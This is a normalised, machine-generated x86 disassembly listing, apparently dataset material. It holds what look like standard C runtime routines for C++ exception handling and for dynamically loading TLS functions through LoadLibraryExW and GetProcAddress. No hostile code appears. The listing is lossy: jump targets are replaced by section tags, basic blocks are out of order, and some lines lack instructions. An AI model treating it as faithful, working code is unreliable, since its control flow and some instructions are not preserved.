push [ ebp - 0x20 ]
call sub_40f575
pop ecx
test al al
je r-xdata
cmp [ esi + 0x1c ] 0x0
je r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ edi + 0x1c ] 0x0
jne r-xdata
lea edi [ ecx - 0x10 ]
mov [ ebp - 0x38 ] edi
mov edi [ ebp + 0x18 ]
cmp [ ecx - 0x10 ] eax
jg r-xdata
mov ebx [ ecx ]
mov [ ebp - 0x14 ] ebx
mov ebx [ ecx - 0x4 ]
test ebx ebx
mov [ ebp - 0x1c ] ebx
mov ebx [ ebp + 0xc ]
jle r-xdata
jmp r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
test [ edi + 0x20 ] 0x4
jne r-xdata
test [ edi + 0x20 ] 0x4
je r-xdata
mov eax [ esi + 0x1c ]
mov ecx [ ebp - 0x14 ]
mov eax [ eax + 0xc ]
mov edx [ eax ]
add eax 0x4
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] edx
push 0x1
push esi
call sub_40ec7c
pop ecx
pop ecx
lea ecx [ ebp - 0x44 ]
call sub_40ed31
push r--data
lea eax [ ebp - 0x44 ]
push eax
call sub_40e753
push [ edi + 0x1c ]
push esi
call sub_40f4d9
pop ecx
pop ecx
test al al
jne r-xdata
dec eax
add ecx 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x14 ] ecx
test eax eax
jle r-xdata
mov eax [ ebp - 0x10 ]
push [ esi + 0x1c ]
push [ eax ]
push ecx
call sub_40fd87
add esp 0xc
test eax eax
jne r-xdata
call sub_40eb5b
call sub_40eb5b
call sub_40eb5b
mov [ eax + 0x10 ] esi
call sub_40eb5b
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp - 0xc ]
push esi
mov [ eax + 0x14 ] ecx
jne r-xdata
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x34 ]
jmp r-xdata
push [ ebp - 0x28 ]
mov eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x20 ]
push [ ebp - 0x38 ]
push [ eax ]
push [ ebp - 0x14 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push ebx
push esi
call sub_40ef9b
add esp 0x2c
mov eax [ ebp - 0x24 ]
add [ ebp - 0x10 ] 0x4
dec eax
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x24 ] eax
test eax eax
jg r-xdata
push [ ebp + 0x24 ]
push ebx
jmp r-xdata
mov edi [ ebp - 0x30 ]
mov [ ebp - 0x10 ] edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x24 ] edx
test edx edx
jle r-xdata
mov eax [ ebp - 0x1c ]
call sub_40d69c
push 0xffffffff
push edi
push [ ebp + 0x14 ]
push ebx
call sub_40fb75
add esp 0x10
push [ edi + 0x1c ]
call sub_40ef61
sub_40f3be
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x80000003
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
push ebx
push esi
call sub_40eb5b
mov ebx [ ebp + 0x18 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
push 0x0
call [ EncodePointer@IAT ]
mov esi eax
call sub_40eb5b
cmp [ eax + 0x8 ] esi
je r-xdata
call sub_42d238
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x1c ]
push [ ebp + 0x20 ]
push ebx
call sub_40d5f2
mov ecx [ ebp - 0x8 ]
add esp 0x14
mov edx [ ebp - 0x4 ]
cmp ecx edx
jae r-xdata
cmp [ edi ] 0xe0434f4d
je r-xdata
pop esi
pop ebx
lea esi [ eax + 0xc ]
mov eax [ ebp + 0x1c ]
cmp [ edi ] 0xe0434352
je r-xdata
inc ecx
add esi 0x14
mov [ ebp - 0x8 ] ecx
cmp ecx edx
jb r-xdata
cmp eax [ esi - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_40d515
add esp 0x1c
test eax eax
jne r-xdata
cmp eax [ esi - 0xc ]
jl r-xdata
mov eax [ esi ]
mov edi [ esi + 0x4 ]
shl eax 0x4
mov edi [ edi + eax - 0xc ]
test edi edi
je r-xdata
mov edi [ esi + 0x4 ]
add edi 0xfffffff0
add eax edi
mov edi [ ebp + 0x8 ]
test [ eax ] 0x40
jne r-xdata
mov edx [ esi + 0x4 ]
mov ebx [ edx + eax - 0xc ]
mov edx [ ebp - 0x4 ]
cmp [ ebx + 0x8 ] 0x0
mov ebx [ ebp + 0x18 ]
jne r-xdata
mov eax [ ebp + 0x1c ]
push 0x1
push [ ebp + 0x24 ]
lea ecx [ esi - 0xc ]
push [ ebp + 0x20 ]
push ecx
push 0x0
push eax
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_40ef9b
mov edx [ ebp - 0x4 ]
add esp 0x2c
mov ecx [ ebp - 0x8 ]
sub_40f4d9
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
je r-xdata
call sub_42d238
mov edi [ esi ]
xor ebx ebx
test edi edi
jle r-xdata
pop edi
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov [ ebp - 0x4 ] ebx
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ecx [ eax ]
add eax 0x4
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
add edx 0x10
mov [ ebp - 0x4 ] edx
sub edi 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
add eax edx
mov [ ebp - 0x14 ] eax
mov ecx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
test eax eax
jle r-xdata
mov bl 0x1
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
dec eax
add ecx 0x4
mov [ ebp - 0x8 ] eax
test eax eax
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0x14 ]
jg r-xdata
mov edx [ ebp + 0x8 ]
push [ edx + 0x1c ]
push [ ecx ]
push eax
call sub_40fd87
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
sub_40f575
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp [ edi ] esi
jle r-xdata
xor al al
mov ebx esi
mov al 0x1
jmp r-xdata
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi + 0x4 ]
push rw-data
mov eax [ ebx + eax + 0x4 ]
add eax 0x4
push eax
call sub_40e948
pop ecx
pop ecx
test eax eax
je r-xdata
sub_40f5fe
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
mov eax [ ecx ]
mov esi [ ecx + 0x4 ]
add eax edx
test esi esi
js r-xdata
pop esi
pop ebp
retn
mov ecx [ ecx + 0x8 ]
mov edx [ esi + edx ]
mov ecx [ edx + ecx ]
add ecx esi
add eax ecx
sub_40f623
push 0x8
push r--data
call sub_40d270
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
test [ edx ] 0x80000000
je r-xdata
lea edi [ ecx + 0xc ]
add edi [ edx + 0x8 ]
mov edi ecx
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_40f5fe
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_40f5bb
sub eax 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push edx
push ecx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_40f6b5
add esp 0x10
sub eax 0x1
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40d2b6
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_40f5fe
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_40f5c2
jmp r-xdata
sub_40f6b5
push 0x10
push r--data
call sub_40d270
xor ebx ebx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] bl
je r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ eax ]
mov esi [ ebp + 0xc ]
test ecx ecx
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] ebx
mov edi [ ebp + 0x14 ]
test cl cl
jns r-xdata
add esi 0xc
add esi edx
mov eax [ ebp + 0x8 ]
test cl 0x8
je r-xdata
test [ edi ] 0x10
je r-xdata
test [ edi ] 0x1
je r-xdata
mov ecx [ eax + 0x18 ]
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
cmp [ edi + 0x18 ] ebx
jne r-xdata
cmp [ eax + 0x18 ] 0x0
je r-xdata
call sub_42d238
test esi esi
je r-xdata
mov ecx eax
call j_sub_40d4a2
call [ ebp - 0x1c ]
mov ecx eax
jmp r-xdata
cmp [ eax + 0x18 ] ebx
je r-xdata
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
test esi esi
je r-xdata
mov [ esi ] ecx
lea eax [ edi + 0x8 ]
push eax
push ecx
jmp r-xdata
test ecx ecx
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
push [ edi + 0x14 ]
push [ eax + 0x18 ]
push esi
call sub_416860
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
call sub_40f5fe
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
test [ edi ] 0x4
push 0x0
pop ebx
setne bl
inc ebx
mov [ ebp - 0x20 ] ebx
push [ edi + 0x14 ]
lea eax [ edi + 0x8 ]
push eax
push ecx
call sub_40f5fe
pop ecx
pop ecx
push eax
push esi
call sub_416860
add esp 0xc
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax ebx
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
call sub_40d2b6
retn
lea eax [ edi + 0x8 ]
push eax
push [ esi ]
sub_40f7e7
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
call sub_40eb5b
inc [ eax + 0x18 ]
xor eax eax
inc eax
pop ebp
retn
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
sub_40f833
push ebp
mov ebp esp
sub esp 0x14
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov esi [ esi ]
push ebx
mov ebx [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] 0xe0434f4d
je r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp [ esi ] 0xe06d7363
jne r-xdata
cmp [ esi ] 0xe0434352
je r-xdata
cmp [ esi ] 0xe06d7363
jne r-xdata
call sub_40eb5b
inc [ eax + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
test bl 0x40
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
pop edi
pop ebx
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
call sub_40eb5b
cmp [ eax + 0x10 ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
mov eax [ esi + 0x1c ]
or ebx 0x80000000
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x14 ] ebx
mov eax [ eax + 0xc ]
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
jmp r-xdata
call sub_40eb5b
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
test edi edi
jg r-xdata
call sub_40eb5b
mov esi [ eax + 0x10 ]
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
call sub_40fd87
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
call sub_40eb5b
inc [ eax + 0x18 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
dec edi
add ebx 0x4
xor eax eax
inc eax
push [ ebp - 0x4 ]
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x14 ]
push esi
call sub_40f623
add esp 0x10
jmp r-xdata
sub_40f982
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
test esi esi
je r-xdata
or [ edi + 0x8 ] 0xffffffff
or [ edi + 0xc ] 0xffffffff
mov esi [ esi ]
test esi esi
je r-xdata
xor eax eax
inc eax
pop ebp
retn
call sub_40eb5b
and [ eax + 0x18 ] 0x0
cmp [ esi ] 0xe06d7363
jne r-xdata
push [ esi + 0x18 ]
push edi
call sub_40d722
pop ecx
pop ecx
call sub_40eb5b
mov eax [ eax + 0x10 ]
mov [ edi + 0x8 ] eax
call sub_40eb5b
mov eax [ eax + 0x14 ]
mov [ edi + 0xc ] eax
call sub_40eb5b
mov [ eax + 0x10 ] esi
jmp r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_40eb5b
dec [ eax + 0x18 ]
call sub_40eb5b
pop edi
pop esi
cmp [ eax + 0x18 ] 0x0
jge r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
call sub_40eb5b
mov esi [ eax + 0x10 ]
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
sub_40fa24
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x8 ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
push ebx
push esi
call sub_40d746
cmp [ ebp + 0xc ] 0x0
mov ebx 0xe06d7363
pop ecx
jne r-xdata
call sub_40eb5b
mov eax [ eax + 0x10 ]
cmp [ eax ] ebx
pop ebx
jne r-xdata
call sub_40eb5b
mov eax [ eax + 0x10 ]
cmp [ eax ] ebx
jne r-xdata
call sub_40eb5b
mov ecx [ esi + 0x8 ]
mov [ eax + 0x10 ] ecx
call sub_40eb5b
mov ecx [ esi + 0xc ]
mov [ eax + 0x14 ] ecx
call sub_40eb5b
mov eax [ eax + 0x10 ]
cmp [ eax + 0x10 ] 0x3
jne r-xdata
call sub_40eb5b
mov eax [ eax + 0x10 ]
cmp [ eax + 0x10 ] 0x3
jne r-xdata
call sub_40eb5b
mov eax [ eax + 0x10 ]
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
call sub_40eb5b
mov eax [ eax + 0x10 ]
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
call sub_40eb5b
mov eax [ eax + 0x10 ]
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
call sub_40eb5b
mov eax [ eax + 0x10 ]
push [ eax + 0x18 ]
call sub_40d78e
pop ecx
test eax eax
je r-xdata
call sub_40eb5b
mov eax [ eax + 0x10 ]
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
call sub_40eb5b
dec [ eax + 0x18 ]
call sub_40eb5b
mov eax [ eax + 0x10 ]
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
push 0x1
call sub_40eb5b
push [ eax + 0x10 ]
call sub_40ec7c
pop ecx
pop ecx
call sub_40eb5b
mov eax [ eax + 0x10 ]
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
sub_40fb30
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe0434352
je r-xdata
call sub_40eb5b
cmp [ eax + 0x18 ] 0x0
jle r-xdata
cmp [ eax ] 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_40eb5b
dec [ eax + 0x18 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
call sub_40eb5b
and [ eax + 0x18 ] 0x0
jmp sub_42d238
sub_40fb75
push 0x10
push r--data
call sub_40d270
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x4 ] 0x80
mov eax [ ebp + 0x8 ]
jg r-xdata
mov esi [ eax + 0x8 ]
movsx esi [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40fc29
cmp esi [ ebp + 0x14 ]
jne r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_40eb5b
inc [ eax + 0x18 ]
and [ ebp - 0x4 ] 0x0
call sub_42d238
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] esi
call sub_40d2b6
retn
mov ecx [ ebp + 0x10 ]
cmp esi [ ecx + 0x4 ]
jge r-xdata
mov eax [ ecx + 0x8 ]
mov edx [ eax + esi * 8 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] 0x1
cmp [ eax + esi * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] edx
push 0x103
push eax
mov eax [ ecx + 0x8 ]
push [ eax + esi * 8 + 0x4 ]
call sub_40ec30
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_40fc3d
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
and [ esi ] 0x0
call sub_40eb5b
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
test [ ecx ] 0x10
je r-xdata
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
push eax
push rw-data
call sub_40fe4c
pop ecx
pop ecx
mov [ esi ] eax
mov eax [ eax + 0x18 ]
mov eax [ eax ]
mov eax [ eax - 0x4 ]
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_40fc8b
push ebp
mov ebp esp
push ebx
push esi
push edi
push [ ebp + 0x10 ]
call sub_40fef0
pop ecx
call sub_40eb5b
mov ecx [ ebp + 0x18 ]
xor esi esi
mov edx [ ebp + 0x8 ]
mov ebx 0x1fffffff
mov edi 0x19930522
cmp [ eax + 0x20 ] esi
jne r-xdata
test [ edx + 0x4 ] 0x66
je r-xdata
cmp [ edx ] 0xe06d7363
je r-xdata
cmp [ ecx + 0xc ] esi
jne r-xdata
cmp [ ecx + 0x4 ] esi
je r-xdata
cmp [ edx ] 0x80000026
je r-xdata
cmp [ edx ] 0xe06d7363
jne r-xdata
mov eax [ ecx ]
and eax ebx
cmp eax 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] esi
jne r-xdata
mov eax [ ecx ]
and eax ebx
cmp eax edi
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call sub_40f060
add esp 0x20
cmp [ edx + 0x10 ] 0x3
jb r-xdata
cmp eax edi
jb r-xdata
cmp [ ecx + 0x1c ] esi
jne r-xdata
push 0xffffffff
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_40fb75
add esp 0x10
jmp r-xdata
test [ ecx + 0x20 ] 0x1
jne r-xdata
cmp [ edx + 0x14 ] edi
jbe r-xdata
test [ ecx + 0x20 ] 0x4
je r-xdata
mov eax [ edx + 0x1c ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
movzx eax [ ebp + 0x24 ]
push eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ecx
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call j_sub_40d4a2
call esi
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40fd87
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov eax [ edx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea ecx [ eax + 0x8 ]
cmp [ ecx ] 0x0
je r-xdata
test [ edx ] 0x80
mov edi [ ebp + 0xc ]
je r-xdata
mov ebx [ edi + 0x4 ]
xor esi esi
cmp eax ebx
je r-xdata
test [ edi ] 0x10
jne r-xdata
test [ edi ] 0x2
je r-xdata
lea eax [ ebx + 0x8 ]
mov eax [ ebp + 0x10 ]
test [ eax ] 0x1
je r-xdata
test [ edx ] 0x8
je r-xdata
sbb eax eax
or eax 0x1
test bl bl
je r-xdata
test [ eax ] 0x2
je r-xdata
test [ edx ] 0x1
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax esi
jmp r-xdata
mov bl [ ecx + 0x1 ]
cmp bl [ eax + 0x1 ]
jne r-xdata
xor esi esi
inc esi
test [ edx ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test eax eax
je r-xdata
add ecx 0x2
add eax 0x2
test bl bl
jne r-xdata
mov bl [ ecx ]
cmp bl [ eax ]
jne r-xdata
sub_40fe4c
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
call sub_42d238
mov eax [ eax ]
test eax eax
je r-xdata
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
mov eax [ eax + 0x1c ]
push ebx
push esi
push edi
mov eax [ eax + 0xc ]
mov ecx [ eax ]
lea esi [ eax + 0x4 ]
test ecx ecx
jle r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
xor eax eax
mov edi [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
sbb eax eax
or eax 0x1
test bl bl
je r-xdata
xor eax eax
inc eax
jmp r-xdata
dec ecx
add esi 0x4
test ecx ecx
jg r-xdata
xor eax eax
jmp r-xdata
mov bl [ edx + 0x1 ]
cmp bl [ eax + 0x1 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi ]
lea edx [ edi + 0x8 ]
mov eax [ eax + 0x4 ]
add eax 0x8
test eax eax
je r-xdata
add edx 0x2
add eax 0x2
test bl bl
jne r-xdata
mov bl [ edx ]
cmp bl [ eax ]
jne r-xdata
sub_41009f
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
push [ esi ]
call sub_410161
pop ecx
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebp
retn
add esi 0x4
sub_4100c1
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebx
push esi
push edi
lea ebx [ eax * 4 + rw-data ]
xor eax eax
[ ebx ] ecx
mov edx [ rw-data ]
or edi 0xffffffff
mov ecx edx
mov esi edx
and ecx 0x1f
xor esi eax
ror esi cl
cmp esi edi
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov esi [ ebp + 0x10 ]
cmp esi [ ebp + 0x14 ]
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
push [ esi ]
call sub_410161
pop ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax edx
push 0x20
and eax 0x1f
pop ecx
sub ecx eax
ror edi cl
xor edi edx
xchg [ ebx ] edi
push [ ebp + 0xc ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
add esi 0x4
cmp esi [ ebp + 0x14 ]
jne r-xdata
mov edx [ rw-data ]
push esi
call sub_40ff1e
pop ecx
xchg [ ebx ] eax
jmp r-xdata
test eax eax
je r-xdata
mov edx [ rw-data ]
sub_410161
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
xor ecx ecx
push edi
xor eax eax
lea edi [ ebx * 4 + rw-data ]
[ edi ] ecx
mov ecx eax
test ecx ecx
je r-xdata
mov ebx [ ebx * 4 + r--data ]
push esi
push 0x800
push 0x0
push ebx
call [ LoadLibraryExW@IAT ]
mov esi eax
test esi esi
jne r-xdata
lea eax [ ecx + 0x1 ]
neg eax
sbb eax eax
and eax ecx
jmp r-xdata
mov eax esi
xchg [ edi ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x57
jne r-xdata
pop edi
pop ebx
pop ebp
retn
mov eax esi
push esi
call [ FreeLibrary@IAT ]
xor esi esi
push esi
push esi
push ebx
call [ LoadLibraryExW@IAT ]
mov esi eax
jmp r-xdata
or eax 0xffffffff
xchg [ edi ] eax
xor eax eax
jmp r-xdata
test esi esi
jne r-xdata
pop esi
sub_4101e2
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
jmp r-xdata
cmp esi [ ebp + 0x10 ]
jne r-xdata
push [ esi ]
call sub_410161
pop ecx
test eax eax
jne r-xdata
xor eax eax
pop esi
test eax eax
jne r-xdata
add esi 0x4
push [ ebp + 0x8 ]
push eax
call [ GetProcAddress@IAT ]
pop ebp
retn
pop ebp
retn
sub_410214
push ebp
mov ebp esp
push 0x800
push 0x0
push [ ebp + 0x8 ]
call [ LoadLibraryExW@IAT ]
test eax eax
jne r-xdata
pop ebp
retn
call [ GetLastError@IAT ]
cmp eax 0x57
jne r-xdata
xor eax eax
push 0x0
push 0x0
push [ ebp + 0x8 ]
call [ LoadLibraryExW@IAT ]
pop ebp
retn
sub_410249
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x0
call sub_4100c1
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x32
pop eax
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call j_sub_40d4a2
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_410289
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x1
call sub_4100c1
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x32
pop eax
push [ ebp + 0x18 ]
mov ecx esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call j_sub_40d4a2
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_4102cc
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x2
call sub_4100c1
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x32
pop eax
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call j_sub_40d4a2
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_410306
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x3
call sub_4100c1
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x32
pop eax
push [ ebp + 0x20 ]
mov ecx esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call j_sub_40d4a2
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_41034f
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x4
call sub_4100c1
mov esi eax
add esp 0x10
test esi esi
je r-xdata
pop esi
pop ebp
jmp [ TlsAlloc@IAT ]
push [ ebp + 0x8 ]
mov ecx esi
call j_sub_40d4a2
call esi
pop esi
pop ebp
retn
sub_410389
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x5
call sub_4100c1
add esp 0x10
mov esi eax
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsFree@IAT ]
mov ecx esi
call j_sub_40d4a2
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_4103c3
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x6
call sub_4100c1
add esp 0x10
mov esi eax
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsGetValue@IAT ]
mov ecx esi
call j_sub_40d4a2
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_4103fd
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x7
call sub_4100c1
add esp 0x10
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsSetValue@IAT ]
mov ecx esi
call j_sub_40d4a2
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_41043a
push ebp
